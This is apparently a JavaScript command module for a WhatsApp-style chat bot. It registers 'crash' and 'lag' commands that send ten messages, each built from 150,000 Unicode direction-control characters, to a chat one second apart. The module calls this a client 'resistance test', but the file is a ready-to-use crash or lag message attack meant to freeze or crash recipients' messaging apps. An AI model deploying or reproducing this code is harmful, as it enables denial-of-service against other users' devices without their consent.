const { PREFIX } = require("../../krampus");

module.exports = {
  name: "crash-test",
  description: "Envía un mensaje lagger para probar la resistencia del cliente.",
  commands: ["crash", "lag"],
  usage: `${PREFIX}crash`,
  handle: async ({ socket, remoteJid }) => {
    try {
      // Configuración de la prueba
      const lagStringLength = 50000; // Longitud del string lagger
      const lagStringRepeat = 10; // Número de veces que se repite el string lagger
      const delayBetweenMessages = 1000; // Retraso entre mensajes (en milisegundos)

      // Crear string lagger
      const lagString = "\u200F\u200E\u202E".repeat(lagStringLength);

      // Enviar mensajes lagger
      for (let i = 0; i < lagStringRepeat; i++) {
        await socket.sendMessage(remoteJid, { text: lagString });
        await new Promise(resolve => setTimeout(resolve, delayBetweenMessages));
      }

      console.log("Prueba de resistencia finalizada.");
    } catch (error) {
      console.error("Error en crash-test:", error);
    }
  },
};
